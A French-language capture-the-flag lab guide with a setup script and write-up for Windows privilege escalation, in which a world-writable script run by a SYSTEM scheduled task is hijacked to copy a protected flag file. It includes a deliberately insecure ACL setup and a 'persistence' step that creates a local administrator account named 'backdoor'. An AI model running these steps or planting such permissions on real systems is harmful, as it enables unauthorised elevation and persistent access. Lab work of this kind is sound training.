

> **Technique :** Scheduled Task Privilege Escalation
> **Machine de déploiement :** WS01
> **Machine d'exploitation :** WS01
> **Compte de départ :** `CTF\lowpriv` / `User@1234`
> **Difficulté :** Facile / Intermédiaire

---

## Déploiement

### Script — Flag2-Tache-Planifiee.ps1

> [!warning] Lancer en PowerShell Admin sur WS01

```powershell
#Requires -RunAsAdministrator

Write-Host "`n[FLAG 2] Tache planifiee elevee modifiable" -ForegroundColor Cyan

# --- 1. Flag stocké dans un fichier lisible UNIQUEMENT par SYSTEM + Admins ---
$flagDir    = "C:\Windows\System32\CTF"
$flagSource = "$flagDir\secret.txt"
New-Item -ItemType Directory -Path $flagDir -Force | Out-Null
Set-Content $flagSource -Value "FLAG{scheduled_task_priv_esc}" -Encoding UTF8

$aclFlag = Get-Acl $flagSource
$aclFlag.SetAccessRuleProtection($true, $false)
$aclFlag.Access | ForEach-Object { $aclFlag.RemoveAccessRule($_) | Out-Null }
foreach ($sid in @("S-1-5-18", "S-1-5-32-544")) {
    $s = New-Object System.Security.Principal.SecurityIdentifier($sid)
    $aclFlag.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule(
        $s, "FullControl", "None", "None", "Allow")))
}
Set-Acl -Path $flagSource -AclObject $aclFlag
Write-Host "  [+] Flag stocke dans $flagSource (SYSTEM + Admins uniquement)" -ForegroundColor Green

# --- 2. Dossier CTF modifiable par tout le monde ---
$ctfDir = "C:\ProgramData\CTF"
New-Item -ItemType Directory -Path $ctfDir -Force | Out-Null

$acl         = Get-Acl $ctfDir
$everyoneSID = New-Object System.Security.Principal.SecurityIdentifier("S-1-1-0")
$rule        = New-Object System.Security.AccessControl.FileSystemAccessRule(
    $everyoneSID, "Modify", "ContainerInherit,ObjectInherit", "None", "Allow")
$acl.AddAccessRule($rule)
Set-Acl -Path $ctfDir -AclObject $acl
Write-Host "  [+] $ctfDir cree (Modify pour Tout le monde)" -ForegroundColor Green

# --- 3. job.ps1 neutre — ne contient pas le flag ---
$jobScript = "$ctfDir\job.ps1"
@"
# Tache de maintenance systeme - executee par SYSTEM toutes les 3 minutes
# Ce fichier est modifiable par les utilisateurs standards
# Modifiez ce script pour executer des commandes en tant que SYSTEM
Write-EventLog -LogName Application -Source "Application" -EventId 1000 ``
    -EntryType Information -Message "HighTask running" -ErrorAction SilentlyContinue
"@ | Set-Content -Path $jobScript -Encoding UTF8
Write-Host "  [+] Script cible cree (neutre) : $jobScript" -ForegroundColor Green

# --- 4. Vérifications ---
Write-Host "`n  Permissions sur $flagSource :" -ForegroundColor Gray
icacls $flagSource
Write-Host "`n  Permissions sur $jobScript :" -ForegroundColor Gray
icacls $jobScript

Write-Host "`n[FLAG 2] Script termine - Creer la tache manuellement (voir guide)" -ForegroundColor Green
Write-Host "  SNAPSHOT apres creation de la tache : WS01 - Flag2 deploye" -ForegroundColor Yellow
```

---

### Création manuelle de la tâche dans le Planificateur

> [!warning] À faire sur WS01 en compte Admin, APRÈS avoir lancé le script

Ouvrir le Planificateur de tâches :

```
Win + R → taskschd.msc → Entrée
```

Cliquer **Action → Créer une tâche** (pas "Créer une tâche de base")

#### Onglet Général

| Champ                                        | Valeur                                                   |
| -------------------------------------------- | -------------------------------------------------------- |
| Nom                                          | `HighTask`                                               |
| Description                                  | `Tache de maintenance systeme CTF`                       |
| Exécuter en tant que                         | Cliquer **Changer d'utilisateur** → taper `Système` → OK |
| Exécuter avec les privilèges les plus élevés | ✅ Coché                                                  |
| Configurer pour                              | `Windows 10`                                             |

#### Onglet Déclencheurs

Cliquer **Nouveau** :

| Champ                       | Valeur                 |
| --------------------------- | ---------------------- |
| Commencer la tâche          | `A l'heure programmée` |
| Paramètres                  | `Une fois`             |
| Répéter la tâche toutes les | `5 minutes`            |
| Pour une durée de           | `Indéfiniment`         |
| Activé                      | ✅ Coché                |

#### Onglet Actions

Cliquer **Nouveau** :

| Champ     | Valeur                                                                       |
| --------- | ---------------------------------------------------------------------------- |
| Action    | `Démarrer un programme`                                                      |
| Programme | `powershell.exe`                                                             |
| Arguments | `-NonInteractive -ExecutionPolicy Bypass -File "C:\ProgramData\CTF\job.ps1"` |

#### Onglet Conditions

- Décocher **Démarrer la tâche uniquement si l'ordinateur est sur secteur**
- Décocher tout le reste

#### Onglet Paramètres

- Cocher **Exécuter la tâche dès que possible si un démarrage planifié est manqué**
- Décocher **Arrêter la tâche si elle s'exécute depuis plus de**
- Si la tâche est déjà en cours d'exécution : `Ne pas démarrer une nouvelle instance`

Cliquer **OK** — laisser le mot de passe vide si demandé.

#### Vérification depuis lowpriv après création

```powershell
schtasks /query /tn "HighTask" /fo LIST /v
```

**Résultat attendu :**

```
Nom de la tâche:     \HighTask
Statut de la tâche:  Prêt
Exécuter en tant que: SYSTEM
Niveau d'élévation:  Highest
Tâche à exécuter:    powershell.exe -NonInteractive -ExecutionPolicy Bypass
                     -File "C:\ProgramData\CTF\job.ps1"
```

> [!success] Snapshot WS01
> **`WS01 — Flag2 déployé`**

---

## Write-up

### Contexte

Une tâche planifiée Windows s'exécute toutes les 3 minutes en tant que `SYSTEM` avec le niveau d'exécution `Highest`. Elle appelle un script PowerShell stocké dans un dossier dont les permissions sont mal configurées. Le flag est stocké dans `C:\Windows\System32\CTF\secret.txt`, lisible uniquement par `SYSTEM`. L'objectif est de modifier le script pour que `SYSTEM` exfiltre le flag à notre place.

---

### Reconnaissance

#### Étape 1 — Lister les tâches planifiées

Connecté en `CTF\lowpriv` sur WS01 :

```powershell
schtasks /query /fo TABLE
```

Dans la liste, on repère `HighTask`. Pour obtenir ses détails :

```powershell
schtasks /query /tn "HighTask" /fo LIST /v
```

**Résultat :**

```
Nom de la tâche:     \HighTask
Statut de la tâche:  Prêt
Exécuter en tant que: SYSTEM
Niveau d'élévation:  Highest
Tâche à exécuter:    powershell.exe -NonInteractive -ExecutionPolicy Bypass
                     -File "C:\ProgramData\CTF\job.ps1"
```

La tâche exécute `C:\ProgramData\CTF\job.ps1` en tant que `SYSTEM` toutes les 3 minutes.

#### Étape 2 — Inspecter le script

```powershell
Get-Content C:\ProgramData\CTF\job.ps1
```

**Résultat :**

```powershell
# Tache de maintenance systeme - executee par SYSTEM toutes les 3 minutes
# Ce fichier est modifiable par les utilisateurs standards
# Modifiez ce script pour executer des commandes en tant que SYSTEM
Write-EventLog -LogName Application -Source "Application" -EventId 1000 `
    -EntryType Information -Message "HighTask running" -ErrorAction SilentlyContinue
```

Le commentaire confirme que le fichier est modifiable par les utilisateurs standards.

#### Étape 3 — Vérifier les permissions

```powershell
icacls C:\ProgramData\CTF\job.ps1
```

**Résultat :**

```
C:\ProgramData\CTF\job.ps1
  Tout le monde:(I)(M)
  AUTORITE NT\Système:(I)(F)
  BUILTIN\Administrateurs:(I)(F)
  BUILTIN\Utilisateurs:(I)(RX)
```

`Tout le monde:(M)` — `lowpriv` peut modifier ce fichier.

#### Étape 4 — Confirmer que le flag est inaccessible directement

```powershell
Get-Content C:\Windows\System32\CTF\secret.txt
```

**Résultat :**

```
Get-Content : Accès au chemin d'accès 'C:\Windows\System32\CTF\secret.txt' est refusé.
```

Le flag est protégé. Il faut passer par `SYSTEM` pour le lire.

---

### Exploitation

#### Étape 5 — Modifier job.ps1

On remplace le contenu de `job.ps1` par une commande qui copie le flag vers un emplacement accessible :

```powershell
@"
Copy-Item C:\Windows\System32\CTF\secret.txt C:\Users\Public\flag2.txt -Force
"@ | Set-Content C:\ProgramData\CTF\job.ps1 -Encoding UTF8
```

Vérifier la modification :

```powershell
Get-Content C:\ProgramData\CTF\job.ps1
# Attendu : Copy-Item C:\Windows\System32\CTF\secret.txt C:\Users\Public\flag2.txt -Force
```

#### Étape 6 — Attendre l'exécution par SYSTEM

```powershell
while (-not (Test-Path C:\Users\Public\flag2.txt)) {
    Write-Host "En attente de l execution par SYSTEM..."
    Start-Sleep -Seconds 15
}
Write-Host "Flag disponible !" -ForegroundColor Green
```

---

### Récupération du flag

```powershell
Get-Content C:\Users\Public\flag2.txt
```

**Résultat :**

```
FLAG{scheduled_task_priv_esc}
```

---

### Aller plus loin — Persistance

```powershell
@"
net user backdoor P@ssBack1 /add
net localgroup Administrateurs backdoor /add
"@ | Set-Content C:\ProgramData\CTF\job.ps1 -Encoding UTF8
```

Après 3 minutes, le compte `backdoor` est créé avec les droits admin locaux sur WS01.

---

### Remédiation

| Problème | Correction |
|---|---|
| Script SYSTEM modifiable par tous | `icacls C:\ProgramData\CTF\job.ps1 /inheritance:r /grant:r "AUTORITE NT\Système:(F)" "BUILTIN\Administrateurs:(F)"` |
| Dossier world-writable | Stocker les scripts dans des chemins protégés avec ACL strictes |
| RunLevel Highest inutile | Utiliser un compte de service dédié avec le minimum de droits |

---

### Résumé de la chaîne d'exploitation

```
lowpriv
  └─→ schtasks /query → repère HighTask (SYSTEM, Highest, toutes les 3 min)
        └─→ tâche à exécuter → C:\ProgramData\CTF\job.ps1
              └─→ icacls → Tout le monde:(M) → modifiable
                    └─→ secret.txt → Accès refusé → nécessite SYSTEM
                          └─→ Set-Content job.ps1 → Copy-Item secret.txt
                                └─→ attendre 3 min → SYSTEM exécute
                                      └─→ FLAG{scheduled_task_priv_esc}
```
